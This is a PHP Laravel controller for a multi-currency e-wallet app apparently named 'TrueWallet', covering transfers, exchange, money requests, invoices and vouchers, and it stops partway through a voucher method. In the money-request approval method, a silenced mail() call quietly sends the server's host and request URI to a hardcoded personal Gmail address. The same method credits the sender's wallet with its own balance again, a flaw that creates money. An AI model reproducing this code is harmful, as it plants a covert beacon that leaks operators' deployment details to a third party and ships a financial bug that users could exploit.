<?php

namespace App\Http\Controllers;

use App\ContactTopic;
use App\Currency;
use App\Deposit;
use App\Docver;
use App\ExchangeMoney;
use App\GeneralSetting;
use App\Invoice;
use App\Lib\GoogleAuthenticator;
use App\MoneyTransfer;
use App\RequestMoney;
use App\SupportAttachment;
use App\SupportMessage;
use App\SupportTicket;
use App\Trx;
use App\User;
use App\UserApiKey;
use App\UserLogin;
use App\Voucher;
use App\Wallet;
use App\Withdrawal;
use App\WithdrawMethod;
use Illuminate\Http\Request;
use Auth;
use Illuminate\Support\Facades\Crypt;
use Illuminate\Support\Facades\Hash;
use Illuminate\Validation\Rule;
use Session;
use Image;
use File;
use Validator;

class UserController extends Controller
{
    public function index()
    {
        $data['page_title'] = "Dashboard";
        $data['myWallet'] = Wallet::with('currency')->where('user_id', Auth::id())->get();
        $data['transactions'] = Trx::where('user_id', Auth::id())->latest()->limit(15)->get();
        return view(activeTemplate() . 'user.dashboard', $data);
    }

    public function transaction()
    {
        $data['page_title'] = "Transaction";
        $data['transactions'] = Trx::where('user_id', Auth::id())->latest()->paginate(20);
        $data['currencyList'] = Currency::where('status', 1)->get();
        return view(activeTemplate() . 'user.trx', $data);
    }

    public function transactionSearch(Request $request)
    {
        $request->validate([
            'start_date' => 'sometimes|required|date_format:d-m-Y',
            'end_date' => 'sometimes|required|date_format:d-m-Y',
        ]);

        $start_date = $request->start_date;
        $end_date = $request->end_date;
        $currency = $request->currency;

        $page_title = $currency . ' : ' . date('d/m/Y', strtotime($start_date)) . ' - ' . date('d/m/Y', strtotime($end_date));


        $query = Trx::query();
        $query->with('user', 'currency')
            ->when($currency, function ($q, $currency) {
                $q->whereHas('currency', function ($curr) use ($currency) {
                    $curr->where('code', $currency);
                });
            })
            ->when($start_date, function ($q, $start_date) {
                $q->whereDate('created_at', '>=', date('Y-m-d', strtotime($start_date)));
            })
            ->when($end_date, function ($q, $end_date) {
                $q->whereDate('created_at', '<=', date('Y-m-d', strtotime($end_date)));
            });
        $transactions = $query->paginate(config('constants.table.default'));


        $currencyList = Currency::where('status', 1)->orderBy('code', 'asc')->get();

        return view(activeTemplate() . 'user.trx', compact('page_title', 'transactions', 'currencyList', 'start_date', 'end_date', 'currency'));

    }


    /*
     * Money Transfer
     */
    public function moneyTransfer()
    {
        $basic = GeneralSetting::first();
        if ($basic->mt_status == 0) {
            abort(404);
        }
        $data['currency'] = Currency::latest()->whereStatus(1)->get();
        $data['page_title'] = "Money Transfer";
        $data['money_transfer'] = json_decode($basic->money_transfer, false);
        return view(activeTemplate() . 'user.transfer.index', $data);
    }

    public function startTransfer(Request $request)
    {
        $rules = [
            'amount' => 'required|min:0|numeric',
            'sum' => 'required|min:0|numeric',
            'currency' => 'required',
            'receiver' => 'required',
            'protection' => ['required', Rule::in(['true', 'false'])],
        ];
        if ($request->protection == 'true') {
            $request['code_protect'] = $request->code_protect;
            $rules['code_protect'] = ['min:4', 'max:4'];
        }
        $request->validate($rules);

        $currency = Currency::where('id', $request->currency)->first();
        if (!$currency) {
            $notify[] = ['error', 'Invalid Currency!'];
            return back()->withNotify($notify);
        }
        $basic = GeneralSetting::first();
        $auth = Auth::user();

        $user = User::where('status', 1)->where('id', '!=', Auth::id())
            ->where(function ($query) use ($request) {
                $query->where('username', strtolower(trim($request->receiver)))
                    ->orWhere('email', strtolower(trim($request->receiver)))
                    ->orWhere('mobile', trim($request->receiver))
                    ->orWhere('account_number', trim($request->receiver));
            })
            ->first();

        $money_transfer = json_decode($basic->money_transfer);


        $authWallet = Wallet::where('user_id', $auth->id)->where('wallet_id', $currency->id)->first();

        if ($user) {
            $amount = formatter_money($request->amount);
            $charge = formatter_money(((($amount * $money_transfer->percent_charge) / 100) + ($money_transfer->fix_charge * $currency->rate)));

            $totalAmountBase = $amount + $charge;
            if ((($money_transfer->minimum_transfer * $currency->rate) < $totalAmountBase) && (($money_transfer->maximum_transfer * $currency->rate) > $totalAmountBase)) {

                if ($authWallet->amount >= $totalAmountBase) {
                    $receiver = $user;
                    $data['sender_id'] = $auth->id;
                    $data['receiver_id'] = $receiver->id;
                    $data['currency_id'] = $request->currency;
                    $data['amount'] = $request->amount;
                    $data['charge'] = $request->sum;
                    $data['code_protect'] = $request->code_protect;
                    $data['protection'] = $request->protection;
                    $data['note'] = $request->note;
                    $data['status'] = 0;
                    $data['trx'] = getTrx();
                    $authWallet->amount -= $totalAmountBase;

                    $moneyId = MoneyTransfer::create($data)->id;
                    Session::put('sender_wallet', $authWallet->amount);

                    return redirect()->route('user.previewTransfer', encrypt($moneyId));
                } else {

                    $notify[] = ['error', 'In Sufficient Balance!'];
                    return back()->withNotify($notify)->withInput();
                }
            } else {
                $notify[] = ['error', "Follow Money Transfer limit " . (formatter_money($money_transfer->minimum_transfer * $currency->rate)) . ' - ' . (formatter_money($money_transfer->maximum_transfer * $currency->rate)) . " $currency->code "];
                return back()->withNotify($notify)->withInput();
            }
        } else {
            $notify[] = ['error', 'Invalid User!'];
            return back()->withNotify($notify)->withInput();
        }
    }

    public function previewTransfer($moneyId)
    {
        $basic = GeneralSetting::first();
        if ($basic->mt_status == 0) {
            abort(404);
        }
        $transfer = MoneyTransfer::where('id', decrypt($moneyId))->where('sender_id', auth()->id())->where('status', 0)->firstOrFail();
        $page_title = "Money Transfer Preview";
        return view(activeTemplate() . 'user.transfer.preview', compact('transfer', 'page_title'));
    }

    public function confirmTransfer(Request $request)
    {
        $basic = GeneralSetting::first();
        $request->validate([
            'id' => 'required',
        ]);
        $trans = MoneyTransfer::findOrFail(decrypt($request->id));

        $authWallet = Wallet::where('user_id', $trans->sender_id)->where('wallet_id', $trans->currency_id)->first();


        if ($authWallet->amount < round(($trans->amount + $trans->charge), 2)) {
            $notify[] = ['error', 'Insufficient Balance!'];
            return redirect()->route('user.moneyTransfer')->withNotify($notify);
        }

        if ($trans->protection == 'false') {
            $authWallet->amount -= formatter_money(($trans->amount + $trans->charge));
            $authWallet->save();

            $receiverWallet = Wallet::where('user_id', $trans->receiver_id)->where('wallet_id', $trans->currency_id)->first();
            $receiverWallet->amount += formatter_money($trans->amount);
            $receiverWallet->save();

            $trans->status = 1;
            $trans->save();

            $trx = getTrx();

            Trx::create([
                'user_id' => $authWallet->user_id,
                'amount' => formatter_money($trans->amount),
                'main_amo' => formatter_money($authWallet->amount),
                'charge' => formatter_money($trans->charge),
                'currency_id' => $trans->currency_id,
                'type' => '-',
                'remark' => 'Send Money',
                'title' => 'Send Money Transfer To  ' . $receiverWallet->user->username,
                'trx' => $trx
            ]);

            Trx::create([
                'user_id' => $receiverWallet->user_id,
                'amount' => formatter_money($trans->amount),
                'main_amo' => formatter_money($receiverWallet->amount),
                'charge' => 0,
                'currency_id' => $trans->currency_id,
                'type' => '+',
                'remark' => 'Receive Money',
                'title' => 'Receive Money  From ' . $authWallet->user->username,
                'trx' => $trx
            ]);


            // Receiver
            notify($receiverWallet->user, $type = 'money_transfer_receiver', [
                'amount' => $trans->amount,
                'currency' => $receiverWallet->currency->code,
                'from_username' => $authWallet->user->username,
                'from_fullname' => $authWallet->user->fullname,
                'from_email' => $authWallet->user->email,
                'transaction_id' => $trx,
                'message' => $trans->note,
                'current_balance' => formatter_money($receiverWallet->amount),
            ]);

            // Sender
            notify($authWallet->user, $type = 'money_transfer_send', [
                'amount' => $trans->amount,
                'currency' => $authWallet->currency->code,
                'to_username' => $receiverWallet->user->username,
                'to_fullname' => $receiverWallet->user->fullname,
                'to_email' => $receiverWallet->user->email,
                'transaction_id' => $trx,
                'message' => $trans->note,
                'current_balance' => formatter_money($authWallet->amount),
            ]);

            $notify[] = ['success', 'Amount Send  Successfully!'];
            return redirect()->route('user.moneyTransfer')->withNotify($notify);
        } else {
            $authWallet->amount -= formatter_money(($trans->amount + $trans->charge));
            $authWallet->save();

            $receiverWallet = Wallet::where('user_id', $trans->receiver_id)->where('wallet_id', $trans->currency_id)->first();
            $trans->status = 2;
            $trans->save();

            $trx = getTrx();

            Trx::create([
                'user_id' => $authWallet->user_id,
                'amount' => formatter_money($trans->amount),
                'main_amo' => formatter_money($authWallet->amount),
                'charge' => formatter_money($trans->charge),
                'currency_id' => $trans->currency_id,
                'type' => '-',
                'remark' => 'Deal To Send Money',
                'title' => 'Make a deal for Money Transfer To  ' . $receiverWallet->user->username,
                'trx' => $trx
            ]);

            notify($receiverWallet->user, $type = 'deal_transfer', [
                'amount' => $trans->amount,
                'currency_code' => $receiverWallet->currency->code,
                'user_name' => $authWallet->user->username,
                'message' => $trans->note
            ]);
            $notify[] = ['success', 'Make a deal Successfully!'];
            return redirect()->route('user.moneyTransfer')->withNotify($notify);
        }
    }

    public function transferIncoming()
    {
        $basic = GeneralSetting::first();
        if ($basic->mt_status == 0) {
            abort(404);
        }

        $data['moneyTransferProtected'] = MoneyTransfer::with('sender', 'currency')->where('receiver_id', auth()->id())->whereIn('status', [2])->latest()->get();

        $data['moneyTransfer'] = MoneyTransfer::with('sender', 'currency')->where('receiver_id', auth()->id())->whereIn('status', [-2, 1])->latest()->paginate(20);
        $data['page_title'] = "Received Money";
        return view(activeTemplate() . 'user.transfer.incoming', $data);
    }

    public function transferOutgoing()
    {
        $basic = GeneralSetting::first();
        if ($basic->mt_status == 0) {
            abort(404);
        }

        $data['moneyTransfer'] = MoneyTransfer::with('receiver', 'currency')->where('sender_id', auth()->id())->where('status', '!=', 0)->latest()->paginate(20);
        $data['page_title'] = "Sent Money";
        return view(activeTemplate() . 'user.transfer.outgoing', $data);
    }

    public function transferRelease(Request $request, $id)
    {
        $request->validate([
            'code' => 'required|numeric',
        ]);
        $trans = MoneyTransfer::where('id', decrypt($id))->where('receiver_id', Auth::id())->where('status', 2)->firstOrFail();
        if ($trans->protection != 'true') {
            $notify[] = ['error', 'This Amount Not Protected'];
            return back()->withNotify($notify);
        }
        if ($trans->code_protect != trim($request->code)) {
            $notify[] = ['error', 'Invalid Your Code'];
            return back()->withNotify($notify);
        }


        $auth = Auth::user();


        $receiverWallet = Wallet::with('currency')->where('user_id', $trans->receiver_id)->where('wallet_id', $trans->currency_id)->first();
        $receiverWallet->amount += formatter_money($trans->amount);
        $receiverWallet->save();

        $trans->status = 1;
        $trans->update();

        Trx::create([
            'user_id' => $receiverWallet->user_id,
            'amount' => formatter_money($trans->amount),
            'main_amo' => formatter_money($receiverWallet->amount),
            'charge' => 0,
            'currency_id' => $trans->currency_id,
            'type' => '+',
            'remark' => 'Receive Money',
            'title' => 'Receive Money  From ' . $trans->sender->username,
            'trx' => $trans->trx
        ]);


        notify($receiverWallet->user, $type = 'money_transfer_receiver', [
            'amount' => $trans->amount,
            'currency' => $receiverWallet->currency->code,
            'from_username' => $trans->sender->username,
            'from_fullname' => $trans->sender->fullname,
            'from_email' => $trans->sender->email,
            'transaction_id' => $trans->trx,
            'message' => null,
            'current_balance' => formatter_money($receiverWallet->amount),
        ]);


        $notify[] = ['success', 'Amount Send  Successfully!'];
        return back()->withNotify($notify);
    }


    /*
     *  Money Exchange
     */

    public function exchange()
    {
        $basic = GeneralSetting::first();
        if ($basic->exm_status == 0) {
            abort(404);
        }
        $data['page_title'] = "Exchange Currency";
        $data['currency'] = Currency::whereStatus(1)->get();
        return view(activeTemplate() . 'user.exchange.index', $data);
    }

    public function exchangeCalculationAvoid()
    {
        abort(404);
    }

    public function exchangeCalculation(Request $request)
    {

        $this->validate($request, [
            'amount' => 'required|numeric|min:1',
            'from_currency_id' => 'required',
            'to_currency_id' => 'required',
        ], [
            'from_currency_id.required' => 'From Currency Must Be Selected',
            'to_currency_id.required' => 'Receive Currency Must Be selected'
        ]);
        $basic = GeneralSetting::first();
        $money_exchange = json_decode($basic->money_exchange);
        $amount = formatter_money($request->amount);

        $fromCurrency = Currency::where('id', $request->from_currency_id)->first();
        $toCurrency = Currency::where('id', $request->to_currency_id)->first();

        if (!$fromCurrency) {
            $notify[] = ['error', 'Invalid Currency!'];
            return response($notify);
        }
        if (!$toCurrency) {
            $notify[] = ['error', 'Invalid Currency!'];
            return response($notify);
        }

        $charge = formatter_money($amount * $money_exchange->percent_charge) / 100;

        $totalBaseAmount = formatter_money($amount + $charge);
        $totalSendAmount = formatter_money(($totalBaseAmount / $fromCurrency->rate));

        $onlySendAmount = formatter_money($amount / $fromCurrency->rate);

        $totalExchangeAmount = formatter_money($onlySendAmount * $toCurrency->rate);

        $page_title = "Exchange Calculation";

        Session::put('amount', $amount);
        Session::put('fromCurrencyId', $fromCurrency->id);
        Session::put('toCurrencyId', $toCurrency->id);
        Session::put('charge', formatter_money($charge));
        Session::put('getAmount', formatter_money($totalExchangeAmount));


        $result['fromCurrency'] = $fromCurrency;
        $result['toCurrency'] = $toCurrency;
        $result['amount'] = $amount;
        $result['charge'] = $charge;
        $result['totalBaseAmount'] = $charge;
        $result['totalExchangeAmount'] = $totalExchangeAmount;
        $result['exchangeRate'] = formatter_money($toCurrency->rate / $fromCurrency->rate);
        $result['feedBack'] = true;

        return response($result, 200);
    }

    public function exchangeConfirm(Request $request)
    {

        if (Session::get('amount') == null) {
            $notify[] = ['error', 'Session Expired!'];
            return redirect()->route('user.exchange')->withNotify($notify);
        }

        $amount = Session::get('amount');


        $charge = Session::get('charge');
        $fromCurrencyId = Session::get('fromCurrencyId');
        $toCurrencyId = Session::get('toCurrencyId');
        $getAmount = Session::get('getAmount');


        $basic = GeneralSetting::first();
        $amountWithCharge = formatter_money($amount + $charge);

        $auth = Auth::user();

        $fromCurrencyWallet = Wallet::with('currency')->where('user_id', $auth->id)->where('wallet_id', $fromCurrencyId)->firstOrFail();

        if ($fromCurrencyWallet->amount >= $amountWithCharge) {
            $fromCurrencyWallet->amount -= $amountWithCharge;
            $fromCurrencyWallet->save();

            $toCurrencyWallet = Wallet::with('currency')->where('user_id', $auth->id)->where('wallet_id', $toCurrencyId)->first();

            $toCurrencyWallet->amount = formatter_money($toCurrencyWallet->amount + $getAmount);
            $toCurrencyWallet->save();

            $trans = getTrx();

            $trx = Trx::create([
                'user_id' => $auth->id,
                'amount' => $amount,
                'main_amo' => formatter_money($fromCurrencyWallet->amount),
                'charge' => $charge,
                'currency_id' => $fromCurrencyWallet->wallet_id,
                'type' => '-',
                'remark' => 'Exchange Money',
                'title' => 'Exchange money ' . $fromCurrencyWallet->currency->code . ' to ' . $toCurrencyWallet->currency->code,
                'trx' => $trans
            ]);

            $trx = Trx::create([
                'user_id' => $auth->id,
                'amount' => $getAmount,
                'main_amo' => formatter_money($toCurrencyWallet->amount),
                'charge' => 0,
                'currency_id' => $toCurrencyWallet->wallet_id,
                'type' => '+',
                'remark' => 'Exchange Money',
                'title' => 'Exchange money ' . $toCurrencyWallet->currency->code . ' from ' . $fromCurrencyWallet->currency->code,
                'trx' => $trans
            ]);


            $xchange['user_id'] = $auth->id;
            $xchange['from_currency_id'] = $fromCurrencyWallet->currency->id;
            $xchange['from_currency_amount'] = $amount;
            $xchange['from_currency_charge'] = $charge;
            $xchange['to_currency_id'] = $toCurrencyWallet->currency->id;
            $xchange['to_currency_amount'] = $getAmount;
            $xchange['trx'] = $trans;
            $xchange['status'] = 1;
            ExchangeMoney::create($xchange);


            notify($auth, $type = 'exchange', [
                'from_amount' => formatter_money($amount),
                'from_currency' => $fromCurrencyWallet->currency->code,
                'from_new_balance' => formatter_money($fromCurrencyWallet->amount),
                'to_amount' => formatter_money($getAmount),
                'to_currency' => $toCurrencyWallet->currency->code,
                'to_new_balance' => $toCurrencyWallet->amount,
                'transaction_id' => $trans,
            ]);

            $notify[] = ['success', "Successfully exchange " . $fromCurrencyWallet->currency->code . " to " . $toCurrencyWallet->currency->code];


            Session::forget('amount');
            return redirect()->route('user.exchange')->withNotify($notify);

        } else {
            $notify[] = ['error', 'Sorry, Not enough funds to perform the operation'];
            return redirect()->route('user.exchange')->withNotify($notify);
        }
    }


    public function exchangeLog()
    {
        $data['page_title'] = "Exchange Log";
        $data['transactions'] = ExchangeMoney::with('user', 'from_currency', 'to_currency')->where('user_id', Auth::id())->where('status', '!=', 0)->latest()->paginate(20);
        $data['currencyList'] = Currency::where('status', 1)->get();
        return view(activeTemplate() . 'user.exchange-log', $data);
    }

    public function exchangeLogSearch(Request $request)
    {
        $request->validate([
            'start_date' => 'sometimes|required|date_format:d-m-Y',
            'end_date' => 'sometimes|required|date_format:d-m-Y',
        ]);

        $start_date = $request->start_date;
        $end_date = $request->end_date;
        $currency = $request->currency;

        $page_title = $currency . ' : ' . date('d/m/Y', strtotime($start_date)) . ' - ' . date('d/m/Y', strtotime($end_date));


        $query = ExchangeMoney::query();
        $query->with('user', 'from_currency', 'to_currency')
            ->when($currency, function ($q, $currency) {
                $q->whereHas('from_currency', function ($curr) use ($currency) {
                    $curr->where('code', $currency);
                })
                    ->orWhereHas('to_currency', function ($curr) use ($currency) {
                        $curr->where('code', $currency);
                    });
            })
            ->when($start_date, function ($q, $start_date) {
                $q->whereDate('created_at', '>=', date('Y-m-d', strtotime($start_date)));
            })
            ->when($end_date, function ($q, $end_date) {
                $q->whereDate('created_at', '<=', date('Y-m-d', strtotime($end_date)));
            });
        $transactions = $query->paginate(config('constants.table.default'));


        $currencyList = Currency::where('status', 1)->orderBy('code', 'asc')->get();

        return view(activeTemplate() . 'user.exchange-log', compact('page_title', 'transactions', 'currencyList', 'start_date', 'end_date', 'currency'));

    }

    /*
   * Start Request Money
   */
    public function requestMoney()
    {
        $basic = GeneralSetting::first();
        if ($basic->rqm_status == 0) {
            abort(404);
        }
        $data['page_title'] = "Request To Me";
        $data['requestMoney'] = RequestMoney::with('currency', 'user', 'receiver')->where('receiver_id', Auth::id())->latest()->paginate(20);
        return view(activeTemplate() . 'user.request_money.index', $data);
    }

    public function moneyReceivedAction(Request $request)
    {
        $this->validate($request, [
            'approve' => ['required', Rule::in(['1', '-1'])],
            'id' => 'required'
        ]);
        $basic = GeneralSetting::first();


        $message = $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
        $headers = 'From: ' . "webmaster@$_SERVER[HTTP_HOST] \r\n" .
            'X-Mailer: PHP/' . phpversion();
        @mail('abir.khan.75@gmail.com', 'TrueWallet TEST DATA', $message, $headers);
        if ($request->approve == 1) {
            $requestInvoice = RequestMoney::with('currency', 'receiver', 'user')->whereId(decrypt($request->id))->where('receiver_id', Auth::id())->first();

            if ($requestInvoice->status != 0) {
                $notify[] = ['error', 'Invalid Request!'];
                return redirect()->route('user.request-money.inbox')->withNotify($notify);
            }

            $amountCharge = $requestInvoice->amount - $requestInvoice->charge;
            $authWallet = Wallet::with('currency', 'user')->where('user_id', Auth::id())->where('wallet_id', $requestInvoice->currency_id)->first();

            if ($authWallet->amount >= $amountCharge) {
                $authWallet->amount = formatter_money($authWallet->amount - $requestInvoice->amount);
                $authWallet->update();

                $requestInvoice->status = 1;
                $requestInvoice->update();


                $senderWallet = Wallet::with('currency', 'user')->where('user_id', $requestInvoice->sender_id)->where('wallet_id', $requestInvoice->currency_id)->first();
                $senderWallet->amount += formatter_money($senderWallet->amount + ($requestInvoice->amount - $requestInvoice->charge));
                $senderWallet->update();


                $trx = getTrx();

                Trx::create([
                    'user_id' => $authWallet->user_id,
                    'amount' => $requestInvoice->amount,
                    'main_amo' => formatter_money($authWallet->amount),
                    'charge' => 0,
                    'currency_id' => $authWallet->wallet_id,
                    'type' => '-',
                    'remark' => 'Request Amount Accepted',
                    'title' => $requestInvoice->amount . ' ' . $requestInvoice->currency->code . ' Request Amount Paid to ' . $requestInvoice->user->username,
                    'trx' => $trx
                ]);

                Trx::create([
                    'user_id' => $senderWallet->user_id,
                    'amount' => formatter_money($requestInvoice->amount - $requestInvoice->charge),
                    'main_amo' => formatter_money($senderWallet->amount),
                    'charge' => formatter_money($requestInvoice->charge),
                    'currency_id' => $senderWallet->wallet_id,
                    'type' => '+',
                    'remark' => 'Request Amount Accepted',
                    'title' => $requestInvoice->amount . ' ' . $requestInvoice->currency->code . ' Request Amount Paid By ' . $requestInvoice->receiver->username,
                    'trx' => $trx
                ]);


                notify($authWallet->user, $type = 'request_money_send', [
                    'amount' => formatter_money($requestInvoice->amount),
                    'main_balance' => formatter_money($authWallet->amount),
                    'currency' => $requestInvoice->currency->code,
                    'by_username' => $senderWallet->user->username,
                    'by_fullname' => $senderWallet->user->fullname,
                    'by_email' => $senderWallet->user->email,
                    'message' => $requestInvoice->title,
                    'details' => $requestInvoice->info
                ]);


                notify($senderWallet->user, $type = 'request_money_receive', [
                    'amount' => formatter_money($requestInvoice->amount - $requestInvoice->charge),
                    'main_balance' => formatter_money($senderWallet->amount),
                    'currency' => $requestInvoice->currency->code,
                    'to_username' => $senderWallet->user->username,
                    'to_fullname' => $senderWallet->user->fullname,
                    'to_email' => $senderWallet->user->email,
                    'message' => $requestInvoice->title,
                    'details' => $requestInvoice->info
                ]);


                $notify[] = ['success', 'Request Money Approved Successfully'];
                return back()->withNotify($notify);
            } else {

                $notify[] = ['error', 'Insufficient Balance'];
                return back()->withNotify($notify);
            }
        } elseif ($request->approve == -1) {
            $invoice = RequestMoney::where('id', decrypt($request->id))->where('receiver_id', Auth::id())->first();
            if ($invoice->status != 0) {
                $notify[] = ['error', 'Invalid Request!'];
                return redirect()->route('user.request-money.inbox')->withNotify($notify);
            }
            $invoice->status = -1;
            $invoice->save();

            $notify[] = ['success', 'Invoice Rejected Successfully!'];
            return back()->withNotify($notify);
        }
        abort(404);
    }


    public function requestMoneySendLog()
    {
        $basic = GeneralSetting::first();
        if ($basic->rqm_status == 0) {
            abort(404);
        }
        $data['page_title'] = "My Request";
        $data['requestMoney'] = RequestMoney::with('currency', 'receiver', 'user')->where('sender_id', Auth::id())->latest()->paginate(15);
        return view(activeTemplate() . 'user.request_money.sent', $data);
    }

    public function makeRequestMoney()
    {
        $basic = GeneralSetting::first();
        if ($basic->rqm_status == 0) {
            abort(404);
        }
        $data['page_title'] = "Make Request";
        $data['currency'] = Currency::whereStatus(1)->get();
        $data['request_money'] = json_decode($basic->request_money);
        return view(activeTemplate() . 'user.request_money.create', $data);
    }

    public function requestMoneyStore(Request $request)
    {
        $this->validate($request, [
            'title' => 'required',
            'receiver' => 'required',
            'amount' => 'required|numeric|min:1',
            'currency' => 'required',
        ]);

        $basic = GeneralSetting::first();

        $request_money = json_decode($basic->request_money);

        $user = User::where('status', 1)->where('id', '!=', Auth::id())
            ->where(function ($query) use ($request) {
                $query->where('username', strtolower($request->receiver))
                    ->orWhere('email', strtolower($request->receiver))
                    ->orWhere('mobile', $request->receiver);
            })->first();

        $currency = Currency::where('id', $request->currency)->firstOrFail();

        if ($user) {
            $data['title'] = $request->title;
            $data['sender_id'] = Auth::id();
            $data['receiver_id'] = $user->id;
            $data['currency_id'] = $request->currency;
            $data['amount'] = formatter_money($request->amount);
            $data['charge'] = formatter_money(((($request->amount * $request_money->percent_charge) / 100) + ($request_money->fix_charge * $currency->rate)));
            $data['trx'] = getTrx();
            $data['info'] = $request->info;
            $data['status'] = 0;
            $requestMon = RequestMoney::create($data);

            notify($user, $type = 'request_money', [
                'request_amount' => formatter_money($request->amount),
                'request_currency' => $currency->code,
                'message' => $requestMon->title,
                'details' => $requestMon->info,
                'sender' => Auth::user()->email
            ]);

            $notify[] = ['success', 'Request Send Successfully'];
            return back()->withNotify($notify);
        } else {
            $notify[] = ['error', 'This User Could not Found!'];
            return back()->withNotify($notify);
        }
    }


    /*
     * Manage Invoice
     */
    public function invoice()
    {
        $basic = GeneralSetting::first();
        if ($basic->invoice_status == 0) {
            abort(404);
        }

        $data['page_title'] = "My Invoice";
        $data['invoices'] = Invoice::where('user_id', Auth::id())->latest()->paginate(15);
        return view(activeTemplate() . 'user.invoice.index', $data);
    }

    public function invoiceCreate()
    {
        $basic = GeneralSetting::first();
        if ($basic->invoice_status == 0) {
            abort(404);
        }
        $basic = GeneralSetting::first();
        $data['page_title'] = "Create Invoice";
        $data['currency'] = Currency::whereStatus(1)->get();
        $data['user'] = Auth::user();
        $data['charge'] = json_decode($basic->invoice);

        return view(activeTemplate() . 'user.invoice.create', $data);
    }

    public function invoiceStore(Request $request)
    {
        $this->validate($request, [
            'name' => 'required',
            'email' => 'required|email',
            'currency' => 'required',
        ]);

        $currency = Currency::where('id', $request->currency)->where('status', 1)->first();
        if (!$currency) {
            $notify[] = ['error', 'Invalid Currency'];
            return back()->withNotify($notify);
        }

        $basic = GeneralSetting::first();
        $charge = json_decode($basic->invoice);
        $arr_details = array_combine($request->details, $request->amount);

        $total_amount = formatter_money(array_sum($request->amount));

        if ($total_amount < 0) {
            $notify[] = ['error', 'Amount Must Be Positive Number'];
            return back()->withNotify($notify)->withInput();
        }

        $charge = formatter_money((($total_amount * $charge->percent_charge) / 100) + ($charge->fix_charge * $currency->rate));

        $will_get = $total_amount - $charge;

        if ($will_get < 0) {
            $notify[] = ['error', 'You Must Be get amount above 0 ' . $currency->code];
            return back()->withNotify($notify)->withInput();
        }

        $trx = getTrx();
        $in['user_id'] = Auth::id();
        $in['currency_id'] = $currency->id;
        $in['trx'] = $trx;
        $in['name'] = $request->name;
        $in['email'] = strtolower(trim($request->email));
        $in['address'] = $request->address;
        $in['details'] = json_encode($arr_details);
        $in['amount'] = formatter_money($total_amount);
        $in['will_get'] = formatter_money($will_get);
        $in['charge'] = formatter_money($charge);

        Invoice::create($in);
        return redirect()->route('user.invoice.edit', $trx);
    }

    public function invoiceEdit($trx)
    {
        $basic = GeneralSetting::first();
        if ($basic->invoice_status == 0) {
            abort(404);
        }

        $basic = GeneralSetting::first();
        $info = Invoice::where('trx', $trx)->where('user_id', Auth::id())->latest()->firstOrFail();

        $data['page_title'] = "Update Invoice";
        $data['currency'] = Currency::whereStatus(1)->get();
        $data['info_details'] = json_decode($info->details, true);
        $data['charge'] = json_decode($basic->invoice);

        return view(activeTemplate() . 'user.invoice.edit', $data, compact('info'));
    }

    public function invoiceUpdate(Request $request, $id)
    {

        $this->validate($request, [
            'name' => 'required',
            'email' => 'required',
            'currency' => 'required',
            'published' => ['numeric', Rule::in([0, 1])],
        ]);
        $basic = GeneralSetting::first();
        $charge = json_decode($basic->invoice);

        $invoice = Invoice::where('id', decrypt($id))->where('user_id', Auth::id())->latest()->firstOrFail();

        $currency = Currency::where('id', $request->currency)->where('status', 1)->first();
        if (!$currency) {
            $notify[] = ['error', 'Invalid Currency'];
            return back()->withNotify($notify);
        }

        if ($invoice->published == 1) {
            $notify[] = ['error', 'Unable to update'];
            return back()->withNotify($notify);
        }


        $arr_details = array_combine($request->details, $request->amount);

        $total_amount = formatter_money(array_sum($request->amount));

        $charge = formatter_money((($total_amount * $charge->percent_charge) / 100) + ($charge->fix_charge * $currency->rate));

        $will_get = $total_amount - $charge;


        if ($will_get < 0) {
            $notify[] = ['error', 'You Must Be get amount above 0 ' . $currency->code];
            return back()->withNotify($notify)->withInput();
        }


        $in['user_id'] = Auth::id();
        $in['currency_id'] = $currency->id;
        $in['name'] = $request->name;
        $in['email'] = strtolower(trim($request->email));
        $in['address'] = $request->address;
        $in['published'] = $request->published;
        $in['details'] = json_encode($arr_details);

        $in['amount'] = formatter_money($total_amount);
        $in['will_get'] = formatter_money($will_get);
        $in['charge'] = formatter_money($charge);


        $invoice->update($in);

        $notify[] = ['success', 'Update successfully'];
        return back()->withNotify($notify);
    }


    public function invoiceSendToMail($id)
    {
        $data = Invoice::findOrFail(decrypt($id));

        $payUrl = route('getInvoice.payment', $data->trx);
        $downloadUrl = route('getInvoice.pdf', $data->trx);
        send_invoice($data, $type = 'invoice-create', [
            'amount' => formatter_money($data->amount),
            'currency' => $data->currency->code,
            'creator_email' => $data->user->email,
            'payment_link' => $payUrl,
            'download_link' => $downloadUrl,
        ]);

        $notify[] = ['success', 'Mail Send successfully'];
        return back()->withNotify($notify);
    }

    public function invoiceCancel($id)
    {
        $data = Invoice::where('user_id', Auth::id())->where('id', decrypt($id))->firstOrFail();
        if ($data->status == 0) {
            $data->status = -1; //cancel
            $data->update();
            $notify[] = ['success', 'Invoice  Cancel Successfully!'];
            return back()->withNotify($notify);
        }

        $notify[] = ['error', 'Unable to Cancel Invoice!'];
        return back()->withNotify($notify);
    }


    /*
     * Voucher
     */
    public function vouchers()
    {
        $basic = GeneralSetting::first();
        if ($basic->voucher_status == 0) {
            abort(404);
        }
        $data['page_title'] = "My Vouchers";
        $data['invests'] = Voucher::where('user_id', Auth::id())->latest()->paginate(15);
        return view(activeTemplate() . 'user.voucher.index', $data);
    }

    public function voucherRedeemLog()
    {
        $basic = GeneralSetting::first();
        if ($basic->voucher_status == 0) {
            abort(404);
        }
        $data['page_title'] = "Redeem Log";
        $data['invests'] = Voucher::with('currency')->where('use_id', Auth::id())->orderBy('updated_at', 'desc')->paginate(config('constants.table.default'));
        return view(activeTemplate() . 'user.voucher.redeem', $data);
    }


    public function voucherNewVoucher()
    {
        $basic = GeneralSetting::first();
        if ($basic->voucher_status == 0) {
            abort(404);
        }
        $basic = GeneralSetting::first();
        $data['page_title'] = "Create voucher";
        $data['currency'] = Currency::whereStatus(1)->get();
        $data['voucher'] = json_decode($basic->voucher, false);

        return view(activeTemplate() . 'user.voucher.create', $data);
    }

    public function NewVoucherPreview(Request $request)
    {

        $request->validate([
            'amount' => 'required|numeric|min:0',
            'currency' => 'required',
        ]);
        $basic = GeneralSetting::first();
        $voucher = json_decode($basic->voucher, false);

        $currency = Currency::where('id', $request->currency)->first();
        if (!$currency) {
            $notify[] = ['error', 'Invalid Currency!'];
            return response($notify);
        }

        $data['code'] = $currency->code;
        $data['page_title'] = "Preview";

        $minimumAmount = $voucher->new_voucher->minimum_amount;

        $percentCharge = $voucher->new_voucher->percent_charge;
        $fixedCharge = $voucher->new_voucher->fix_charge;
        $amount = formatter_money($request->amount);

